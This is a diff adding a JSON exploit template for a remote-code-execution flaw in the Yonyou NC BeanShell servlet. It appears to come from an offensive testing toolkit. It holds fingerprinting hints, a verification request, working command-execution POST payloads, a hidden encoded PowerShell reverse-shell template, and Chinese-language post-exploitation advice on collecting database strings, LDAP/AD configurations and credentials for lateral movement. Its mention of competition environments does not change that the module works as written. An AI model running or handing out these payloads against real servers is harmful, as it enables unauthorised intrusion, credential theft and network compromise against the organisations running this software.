@@ -1,0 +1,129 @@
+{
+  "id": "yonyou-nc-beanshell-rce",
+  "family": "oa",
+  "product": "Yonyou NC",
+  "cve": "N/A",
+  "aliases": [
+    "用友 NC BeanShell",
+    "Yonyou NC BshServlet"
+  ],
+  "severity": "critical",
+  "tags": [
+    "oa",
+    "yonyou",
+    "nc",
+    "beanshell",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "NC 6.x",
+      "NC 6.5",
+      "NC Cloud"
+    ],
+    "fingerprints": [
+      "Page titles, JavaScript assets, or cookies mention NC, UAP, 用友, or nccloud",
+      "Legacy servlet routing coexists with modern NC pages",
+      "/servlet/~ic/bsh.servlet.BshServlet is reachable"
+    ],
+    "signals": [
+      "POSTed bsh.script content changes the response body",
+      "BeanShell endpoint returns command output or interpreter errors",
+      "The servlet is exposed without strong administrative protection"
+    ]
+  },
+  "preconditions": [
+    "The target is a Yonyou NC deployment exposing the BeanShell servlet.",
+    "The servlet is not fully gated behind VPN, SSO, or strong admin auth.",
+    "Returned command output is observable through the HTTP response."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "bsh.script=print(%22nc_probe_2026%22);",
+        "matchers": [
+          "nc_probe_2026",
+          "Response differs from baseline access-denied or 404 behavior"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "bsh.script=exec(%22whoami%22);",
+        "os_hint": "windows"
+      },
+      {
+        "path": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "bsh.script=exec(%22ipconfig%22);",
+        "os_hint": "windows"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "优先识别当前主机是否同时承载 NC 中间件、数据库客户端、文件共享或内网代理能力。",
+      "重点收集 nc.home、uap 配置、数据库连接串、LDAP / AD 对接配置与调度任务凭据。",
+      "如果是比赛第三赛区风格环境，BeanShell 成功后要尽快把主机角色和可横向资源梳理清楚。"
+    ],
+    "shell_options": [
+      {
+        "type": "powershell_reverse_shell",
+        "template": "Use BeanShell to invoke powershell -nop -w hidden -enc {base64_payload}"
+      },
+      {
+        "type": "cmd_probe",
+        "template": "Use BeanShell to run whoami && hostname && ipconfig /all"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先 print，再 whoami / hostname，最后再考虑更重的动作。",
+      "优先识别操作系统和运行身份，再决定是走 PowerShell、cmd 还是 Java 内存侧枚举。",
+      "拿到权限后优先找长期可复用凭据与横向入口，而不是在同一接口上反复跑命令。"
+    ],
+    "safe_commands": [
+      "whoami",
+      "hostname",
+      "ipconfig /all",
+      "set"
+    ],
+    "shell_prerequisites": [
+      "Reverse-shell style payloads require outbound connectivity or an internal relay.",
+      "Direct OS-command execution depends on the servlet not being sandboxed by the application container."
+    ],
+    "fallbacks": [
+      "If exec is unstable, use BeanShell to read local config files and JVM properties instead of direct shelling.",
+      "If the servlet is filtered, pivot to other NC legacy services, deserialization surfaces, or weakly protected admin modules."
+    ]
+  },
+  "detection_notes": [
+    "Yonyou NC targets in competitions frequently pair an OA foothold with internal credential reuse or service pivoting, so environment mapping matters as much as the initial RCE.",
+    "Windows deployment is common, but mixed Java/Linux stacks also exist; always verify before choosing command style."
+  ],
+  "references": [
+    "Public Yonyou NC BeanShell analyses",
+    "Common NC legacy servlet exploitation notes"
+  ]
+}
